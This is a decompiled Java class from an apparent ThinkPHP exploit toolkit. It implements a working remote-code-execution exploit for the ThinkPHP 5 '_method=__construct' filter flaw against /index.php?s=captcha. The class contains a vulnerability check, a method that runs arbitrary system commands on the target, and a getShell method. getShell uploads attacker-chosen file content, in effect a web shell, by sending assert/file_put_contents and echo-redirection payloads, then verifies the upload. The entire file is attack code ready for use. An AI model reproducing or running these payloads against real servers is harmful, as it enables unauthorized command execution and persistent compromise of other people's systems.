/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.net.URLEncoder;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import java.util.ArrayList;
/*    */ import java.util.Base64;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_construct_code_exec_1
/*    */   implements BaseExp {
/* 15 */   private String results = null;
/* 16 */   private HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 20 */     url = url + "/index.php?s=captcha";
/* 21 */     String payload = "_method=__construct&filter[]=var_dump&method=GET&server[REQUEST_METHOD]=dylan";
/* 22 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 23 */     Response response = HttpTool.post(url, payload, this.property);
/* 24 */     if (response.getText().contains("string(5) \"dylan\"")) {
/* 25 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 26 */       return this.results;
/*    */     } 
/* 28 */     if (response.getError() != null) {
/* 29 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 30 */       return this.results;
/*    */     } 
/* 32 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 33 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 38 */     url = url + "/index.php?s=captcha";
/* 39 */     String payload = "_method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=" + cmd;
/* 40 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 41 */     Response response = HttpTool.post(url, payload, this.property);
/* 42 */     if (response.getError() == null) {
/* 43 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 45 */       this.results = response.getError();
/*    */     } 
/* 47 */     return this.results;
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/*    */     try {
/* 54 */       String payload2 = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '" + URLEncoder.encode(content.replace("'", "\""), "UTF-8") + "' >" + fileName;
/*    */       
/* 56 */       String payload3 = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo \"" + URLEncoder.encode(content.replace("\"", "'"), "UTF-8") + "\" >" + fileName;
/*    */       
/* 58 */       content = Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8));
/*    */       
/* 60 */       content = URLEncoder.encode(content, "UTF-8");
/* 61 */       String payload1 = "_method=__construct&filter[]=assert&method=GET&server[REQUEST_METHOD]=file_put_contents('" + fileName + "',base64_decode('" + content + "'))";
/* 62 */       ArrayList<String> payloads = new ArrayList<>();
/* 63 */       payloads.add(payload1);
/* 64 */       payloads.add(payload2);
/* 65 */       payloads.add(payload3);
/* 66 */       this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 67 */       for (String payload : payloads) {
/* 68 */         Response response = HttpTool.post(url + "/index.php?s=captcha", payload, this.property);
/* 69 */         if (response.getError() == null) {
/* 70 */           this.property.clear();
/* 71 */           response = HttpTool.get(url + "/" + fileName, this.property);
/* 72 */           if (response.getCode() == 200) {
/* 73 */             this.results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
/* 74 */             return this.results;
/*    */           } 
/* 76 */           this.results = "[-] 上传失败！";
/*    */           continue;
/*    */         } 
/* 79 */         this.results = "[-] 上传失败: " + response.getError();
/*    */       }
/*    */     
/* 82 */     } catch (Exception e) {
/* 83 */       this.results = "[-] 上传失败: " + e.getMessage();
/*    */     } 
/* 85 */     return this.results;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_construct_code_exec_1.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */